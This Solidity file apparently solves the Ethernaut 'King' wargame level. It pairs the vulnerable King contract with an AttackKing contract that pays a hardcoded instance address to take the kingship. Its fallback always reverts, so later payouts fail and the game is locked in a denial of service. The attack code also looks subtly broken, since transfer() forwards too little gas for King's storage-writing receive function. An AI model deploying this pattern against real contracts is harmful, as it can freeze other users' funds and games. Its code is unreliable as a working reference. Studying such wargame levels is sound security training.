// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    address payable kingAddress =
        payable(0xa363316cb597E9FC0A9DbD26d201E888fc82F06e);

    function setKingAttack(uint _newPrize) external payable {
        kingAddress.transfer(_newPrize);
    }

    fallback() external payable {
        revert();
    }
}

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
